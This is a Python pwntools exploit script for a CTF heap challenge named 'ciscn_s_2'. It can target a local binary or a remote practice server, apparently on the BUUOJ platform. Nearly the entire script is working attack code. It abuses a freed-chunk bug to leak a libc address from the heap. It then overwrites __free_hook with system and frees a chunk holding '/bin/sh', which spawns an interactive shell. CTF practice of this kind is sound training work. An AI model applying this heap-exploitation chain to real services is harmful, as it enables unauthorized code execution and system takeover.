import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_s_2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_s_2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',25218)
			elf=ELF('./ciscn_s_2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a,b):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('size?>',str(a))
			io.sendafter('content:',b)

		def edit(a,b):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Index:',str(a))
			if b!='':
				io.sendafter('content:',b)

		def show(a):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('Index:',str(a))

		def delete(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('Index:',str(a))


		add(0x508,'a')
		add(0x18,'/bin/sh\x00')
		add(0x508,'a')
		delete(0)
		delete(2)
		add(0x18,'\xa0')
		add(0,'')
		show(2)
		io.recv(0x11)
		io.recv(0x9)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		edit(2,'')
		delete(2)
		add(0x18,p64(libc.sym['__free_hook']))
		add(0x18,p64(libc.sym['system']))
		delete(1)



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue